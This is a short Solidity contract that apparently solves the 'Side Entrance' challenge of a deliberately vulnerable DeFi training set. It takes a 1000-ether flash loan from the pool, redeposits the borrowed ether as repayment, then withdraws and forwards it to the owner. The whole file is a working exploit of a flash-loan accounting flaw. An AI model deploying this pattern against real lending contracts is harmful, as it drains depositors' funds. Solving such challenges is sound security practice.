// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract EthGoneInAFlash {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function getFlashLoan() public {
        pool.flashLoan(1000 ether);
    }

    function execute() public payable {
        pool.deposit{value: 1000 ether}();
    }

    function withdraw() public onlyowner {
        pool.withdraw();
        (bool success,) = payable(owner).call{value: 1000 ether}("");
        require(success, "withdraw Failed");
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Unauthorised");
        _;
    }

    receive() external payable {}
}
